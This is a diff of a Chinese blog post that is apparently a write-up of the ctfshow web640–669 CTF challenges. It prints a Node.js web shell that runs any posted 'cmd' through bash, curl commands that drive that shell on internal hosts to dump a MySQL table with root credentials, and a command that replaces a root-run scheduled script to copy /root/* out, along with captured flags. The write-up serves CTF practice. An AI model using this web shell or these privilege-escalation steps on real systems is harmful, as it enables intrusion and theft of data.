@@ -166,7 +166,7 @@ daovoice('update');
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240223205939539.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240223210103237.png">
 <meta property="article:published_time" content="2024-02-23T13:12:54.000Z">
-<meta property="article:modified_time" content="2024-02-23T13:17:51.539Z">
+<meta property="article:modified_time" content="2024-02-25T04:04:15.466Z">
 <meta property="article:author" content="故里">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="ctfshow">
@@ -405,10 +405,16 @@ daovoice('update');
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-02-23 21:12:54 / 修改时间：21:17:51" itemprop="dateCreated datePublished" datetime="2024-02-23T21:12:54+08:00">2024-02-23</time>
+              <time title="创建时间：2024-02-23 21:12:54" itemprop="dateCreated datePublished" datetime="2024-02-23T21:12:54+08:00">2024-02-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-25 12:04:15" itemprop="dateModified" datetime="2024-02-25T12:04:15+08:00">2024-02-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1801,63 +1807,49 @@ function copy(object1, object2)&#123;
         &#125;
     &#125;
   &#125;</code></pre>
-<pre><code class="hljs plaintext">
-原型链污染
-</code></pre>
-<p>var http = require(‘http’);<br>
-var querystring = require(‘querystring’);</p>
-<p>var postHTML = ‘123’;</p>
-<p>http.createServer(function (req, res) {<br>
-var body = “”;<br>
-req.on(‘data’, function (chunk) {<br>
-body += chunk;<br>
-});<br>
-req.on(‘end’, function () {<br>
-body = querystring.parse(body);<br>
-res.writeHead(200, {‘Content-Type’: ‘text/html; charset=utf8’});<br>
-try{<br>
-if(body.cmd) {<br>
-res.write(“username：” + body.cmd);<br>
-var result= global.process.mainModule.constructor._load(‘child_process’).execSync(‘bash -c &quot;’+body.cmd+‘&quot;’).toString();<br>
-res.write(result);<br>
-} else {<br>
-res.write(postHTML);<br>
-}}<br>
-catch{<br>
-res.write(postHTML);<br>
-}<br>
-res.end();<br>
-});<br>
-}).listen(8033);</p>
-<pre><code class="hljs plaintext"></code></pre>
-<p>1=echo <code>curl -X POST -d &quot;cmd=mysql -uroot -proot -e 'use ctfshow;select * from ctfshow_secret'&quot; http://172.2.44.5:8033</code>;</p>
-<p>1=echo <code>curl -X POST -d &quot;cmd=mysql -uroot -proot -e 'use ctfshow;select * from ctfshow_secret'&quot; http://172.2.141.5:8033</code>;</p>
-<pre><code class="hljs plaintext">
-flag_668=ctfshow&#123;5b617bd75e1242ab1f6f70437bb71dd5&#125;
+<pre><code class="hljs plaintext">原型链污染</code></pre>
+<pre><code class="hljs plaintext">var http = require(&#x27;http&#x27;);
+var querystring = require(&#x27;querystring&#x27;);
 
-# web669
+var postHTML = &#x27;123&#x27;;
 
-有个root的进程且普通用户可编辑，且定时执行，那就偷梁换柱就行
-</code></pre>
-<p>1=echo curl -X POST -d “cmd=rm -rf <a target="_blank" rel="noopener" href="http://nodestartup.sh">nodestartup.sh</a>;echo 'cat /root/* &gt; /home/node/1.txt ’ &gt; <a target="_blank" rel="noopener" href="http://nodestartup.sh">nodestartup.sh</a>” <a target="_blank" rel="noopener" href="http://172.2.141.5:8033">http://172.2.141.5:8033</a>;</p>
-<pre><code>
-ctfshow&#123;a6c74ca12174eb538a4c8c8ed99c3a74&#125;
+http.createServer(function (req, res) &#123;
+  var body = &quot;&quot;;
+  req.on(&#x27;data&#x27;, function (chunk) &#123;
+    body += chunk;
+  &#125;);
+  req.on(&#x27;end&#x27;, function () &#123;
+    body = querystring.parse(body);
+    res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf8&#x27;&#125;);
+ try&#123;
+    if(body.cmd) &#123;
+        res.write(&quot;username：&quot; + body.cmd);
+        var result= global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c &quot;&#x27;+body.cmd+&#x27;&quot;&#x27;).toString();
+        res.write(result);
+    &#125; else &#123;
+        res.write(postHTML);
+    &#125;&#125;
+    catch&#123;
+       res.write(postHTML);
+    &#125;
+    res.end();
+  &#125;);
+&#125;).listen(8033);</code></pre>
+<pre><code class="hljs plaintext">1=echo `curl -X POST -d &quot;cmd=mysql -uroot -proot -e &#x27;use ctfshow;select * from ctfshow_secret&#x27;&quot; http://172.2.44.5:8033`;
 
-# 总结
-
-开了三四次靶机，打了两三天，总算打完了，越往后发现自己的不足越多，有时间再多补补。
-
-# 参考
-
-[GOOD1](https://na0h.cn/ctf/ctfshow/ctfshow-终极考核#解法1)
-
-[GOOD2](https://blog.csdn.net/qq_53263789/article/details/123854245)
-
-[GOOD3](https://blog.csdn.net/cosmoslin/article/details/125663487)
-
-[GOOD4](https://blog.csdn.net/miuzzx/article/details/121611613)
-
-</code></pre>
+1=echo `curl -X POST -d &quot;cmd=mysql -uroot -proot -e &#x27;use ctfshow;select * from ctfshow_secret&#x27;&quot; http://172.2.141.5:8033`;</code></pre>
+<pre><code class="hljs plaintext">flag_668=ctfshow&#123;5b617bd75e1242ab1f6f70437bb71dd5&#125;</code></pre>
+<h1 id="web669">web669</h1>
+<p>有个root的进程且普通用户可编辑，且定时执行，那就偷梁换柱就行</p>
+<pre><code class="hljs plaintext">1=echo curl -X POST -d &quot;cmd=rm -rf nodestartup.sh;echo &#x27;cat /root/* &gt; /home/node/1.txt &#x27; &gt; nodestartup.sh&quot; http://172.2.141.5:8033;</code></pre>
+<p>ctfshow{a6c74ca12174eb538a4c8c8ed99c3a74}</p>
+<h1 id="总结">总结</h1>
+<p>开了三四次靶机，打了两三天，总算打完了，越往后发现自己的不足越多，有时间再多补补。</p>
+<h1 id="参考">参考</h1>
+<p><a target="_blank" rel="noopener" href="https://na0h.cn/ctf/ctfshow/ctfshow-%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8#%E8%A7%A3%E6%B3%951">GOOD1</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53263789/article/details/123854245">GOOD2</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/125663487">GOOD3</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/121611613">GOOD4</a></p>
 
     </div>
 
@@ -1986,7 +1978,7 @@ ctfshow&#123;a6c74ca12174eb538a4c8c8ed99c3a74&#125;
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web640"><span class="nav-number">1.</span> <span class="nav-text">web640</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web641"><span class="nav-number">2.</span> <span class="nav-text">web641</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web642"><span class="nav-number">3.</span> <span class="nav-text">web642</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web643"><span class="nav-number">4.</span> <span class="nav-text">web643</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web644"><span class="nav-number">5.</span> <span class="nav-text">web644</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web645"><span class="nav-number">6.</span> <span class="nav-text">web645</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web646"><span class="nav-number">7.</span> <span class="nav-text">web646</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web647"><span class="nav-number">8.</span> <span class="nav-text">web647</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web648"><span class="nav-number">9.</span> <span class="nav-text">web648</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web649"><span class="nav-number">10.</span> <span class="nav-text">web649</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web650"><span class="nav-number">11.</span> <span class="nav-text">web650</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web651"><span class="nav-number">12.</span> <span class="nav-text">web651</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web652"><span class="nav-number">13.</span> <span class="nav-text">web652</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web653"><span class="nav-number">14.</span> <span class="nav-text">web653</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web654"><span class="nav-number">15.</span> <span class="nav-text">web654</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web655"><span class="nav-number">16.</span> <span class="nav-text">web655</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web656"><span class="nav-number">17.</span> <span class="nav-text">web656</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web657"><span class="nav-number">18.</span> <span class="nav-text">web657</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web658"><span class="nav-number">19.</span> <span class="nav-text">web658</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web659"><span class="nav-number">20.</span> <span class="nav-text">web659</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web660"><span class="nav-number">21.</span> <span class="nav-text">web660</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web661"><span class="nav-number">22.</span> <span class="nav-text">web661</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web662"><span class="nav-number">23.</span> <span class="nav-text">web662</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web663"><span class="nav-number">24.</span> <span class="nav-text">web663</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web664"><span class="nav-number">25.</span> <span class="nav-text">web664</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web665"><span class="nav-number">26.</span> <span class="nav-text">web665</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web666"><span class="nav-number">27.</span> <span class="nav-text">web666</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web667"><span class="nav-number">28.</span> <span class="nav-text">web667</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web668"><span class="nav-number">29.</span> <span class="nav-text">web668</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web640"><span class="nav-number">1.</span> <span class="nav-text">web640</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web641"><span class="nav-number">2.</span> <span class="nav-text">web641</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web642"><span class="nav-number">3.</span> <span class="nav-text">web642</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web643"><span class="nav-number">4.</span> <span class="nav-text">web643</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web644"><span class="nav-number">5.</span> <span class="nav-text">web644</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web645"><span class="nav-number">6.</span> <span class="nav-text">web645</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web646"><span class="nav-number">7.</span> <span class="nav-text">web646</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web647"><span class="nav-number">8.</span> <span class="nav-text">web647</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web648"><span class="nav-number">9.</span> <span class="nav-text">web648</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web649"><span class="nav-number">10.</span> <span class="nav-text">web649</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web650"><span class="nav-number">11.</span> <span class="nav-text">web650</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web651"><span class="nav-number">12.</span> <span class="nav-text">web651</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web652"><span class="nav-number">13.</span> <span class="nav-text">web652</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web653"><span class="nav-number">14.</span> <span class="nav-text">web653</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web654"><span class="nav-number">15.</span> <span class="nav-text">web654</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web655"><span class="nav-number">16.</span> <span class="nav-text">web655</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web656"><span class="nav-number">17.</span> <span class="nav-text">web656</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web657"><span class="nav-number">18.</span> <span class="nav-text">web657</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web658"><span class="nav-number">19.</span> <span class="nav-text">web658</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web659"><span class="nav-number">20.</span> <span class="nav-text">web659</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web660"><span class="nav-number">21.</span> <span class="nav-text">web660</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web661"><span class="nav-number">22.</span> <span class="nav-text">web661</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web662"><span class="nav-number">23.</span> <span class="nav-text">web662</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web663"><span class="nav-number">24.</span> <span class="nav-text">web663</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web664"><span class="nav-number">25.</span> <span class="nav-text">web664</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web665"><span class="nav-number">26.</span> <span class="nav-text">web665</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web666"><span class="nav-number">27.</span> <span class="nav-text">web666</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web667"><span class="nav-number">28.</span> <span class="nav-text">web667</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web668"><span class="nav-number">29.</span> <span class="nav-text">web668</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web669"><span class="nav-number">30.</span> <span class="nav-text">web669</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">31.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">32.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
